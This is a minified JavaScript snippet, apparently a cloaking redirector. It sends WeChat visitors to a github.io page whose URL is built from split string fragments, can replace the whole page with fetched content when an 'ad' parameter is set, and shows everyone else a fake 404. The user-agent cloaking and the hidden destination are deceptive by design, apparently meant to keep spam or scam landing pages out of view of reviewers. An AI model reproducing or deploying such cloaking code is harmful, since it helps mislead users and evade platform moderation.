!function() {
    function a(a) {
        var b = new RegExp('(^|&)' + a + '=([^&]*)(&|$)', 'i'), c = window.location.search.substr(1).match(b);
        return null !== c ? unescape(c[2]) :null;
    }
    function b(a) {
        function b(a, b) {
            var c = new XMLHttpRequest();
            c.onreadystatechange = function() {
                (4 === c.readyState && 200 === c.status || 304 === c.status) && 'function' == typeof b && b(c.responseText);
            }, c.open('GET', a, !0), c.send(null);
        }
        b(a, function(a) {
            var b = document.open('text/html', 'replace');
            b.write(a), b.close();
        });
    }
    if (/micromessenger/.test(navigator.userAgent.toLowerCase())) {
		
        if(a('ad') == '1'){
            b('');
        }else{
			var abc = 'https://1235wudi';
			abc += '.github.io/';
			abc += 'zs/';
            //b(abc+'new.html');
		location.href = abc+'new.html';
        }
        //location.href = 'https://ad.kuaizhan.com';
    } else
	{
		location.href = '404.xml';
	}
}();
